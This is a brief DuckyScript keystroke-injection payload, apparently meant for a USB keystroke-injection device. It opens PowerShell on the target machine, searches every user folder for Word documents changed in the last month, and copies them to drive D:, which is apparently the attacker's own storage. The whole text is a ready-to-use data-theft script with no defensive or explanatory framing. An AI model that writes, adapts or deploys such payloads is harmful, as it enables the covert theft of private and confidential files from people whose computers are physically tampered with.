DELAY 2000
STRING powershell
ENTER
DELAY 1000
REM Set variables
STRING $sourceFolder = "C:\\Users"
ENTER
STRING $destinationFolder = "D:\\"
ENTER
STRING $startDate = (Get-Date).AddMonths(-1)
ENTER
STRING $endDate = Get-Date
ENTER
REM Execute the last line
STRING Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Container -Force
ENTER
